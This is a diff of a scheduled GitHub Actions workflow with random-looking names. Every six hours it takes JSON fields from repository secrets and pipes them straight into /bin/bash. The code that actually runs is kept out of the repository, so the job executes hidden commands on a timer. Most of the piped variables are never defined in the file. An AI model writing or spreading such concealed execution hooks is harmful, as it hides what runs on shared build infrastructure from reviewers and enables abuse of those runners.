@@ -2,7 +2,8 @@ name: talentedfrequency
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 5/6 * * *'
+    - cron: '37 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,13 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: talentedfrequency
         env:
-          irncd0655: ${{ secrets.irncd0655 }}
+          md00861: ${{ secrets.md00861 }}
         run: |
-          echo $irncd0655 | jq -r .wlkt98 | /bin/bash
-          echo $ltdlr046 | jq -r .e6671 | /bin/bash
-          echo $gks8 | jq -r .akwdc94 | /bin/bash
-          echo $bkaet487 | jq -r .ratl56001 | /bin/bash
-          echo $kqep7584 | jq -r .wwq2 | /bin/bash
-          echo $zx062 | jq -r .riiu4836 | /bin/bash
-          echo $hm383 | jq -r .jt0 | /bin/bash
+          echo $md00861 | jq -r .vb2 | /bin/bash
+          echo $hbw638 | jq -r .alo4 | /bin/bash
+          echo $o974 | jq -r .hs1338 | /bin/bash
+          echo $mxvob94351 | jq -r .ny91170 | /bin/bash
+          echo $upyi1445 | jq -r .wh8 | /bin/bash
+          echo $xcsiz6 | jq -r .uk38 | /bin/bash
+          echo $ly634 | jq -r .x0129 | /bin/bash
+          echo $fop475 | jq -r .kor975 | /bin/bash
+          echo $w848 | jq -r .sfpsh58372 | /bin/bash
+          echo $vvtkk23 | jq -r .svzu327 | /bin/bash
+          echo $cmqr7 | jq -r .bxmwx99 | /bin/bash
+          echo $wdcg96 | jq -r .kq91 | /bin/bash
 
